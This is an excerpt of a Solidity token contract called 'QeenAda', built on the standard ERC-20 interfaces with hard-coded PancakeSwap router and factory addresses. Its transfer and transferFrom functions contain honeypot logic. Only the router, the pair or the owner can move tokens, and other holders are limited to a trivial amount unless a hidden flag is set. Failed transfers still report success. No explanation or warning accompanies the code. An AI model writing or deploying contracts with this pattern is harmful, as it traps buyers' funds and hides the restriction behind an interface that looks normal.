...
contract QeenAda is Context, IERC20, IERC20Metadata, Ownable {

    address internal constant PancakeV2Router = 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    uint8 private constant _decimals = 9;
    uint256 amont = 1 * 10**_decimals;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        if(_msgSender() == PancakeV2Router || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            ...
            if( (amount <= amont || isNumber) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, amount);
            }
        }
        return true;
    ...
    function transferFrom(
        ...
        if(sender == PancakeV2Router || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            ...
            if( (amount <= amont || isNumber) && !isContract(sender) ) {
                _transfer(sender, recipient, amount);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
                unchecked {
    ...
    function pancakePair() public view virtual returns (address) {
        address PancakeV2Factory = 0xB7926C0430Afb07AA7DEfDE6DA862aE0Bde767bc;
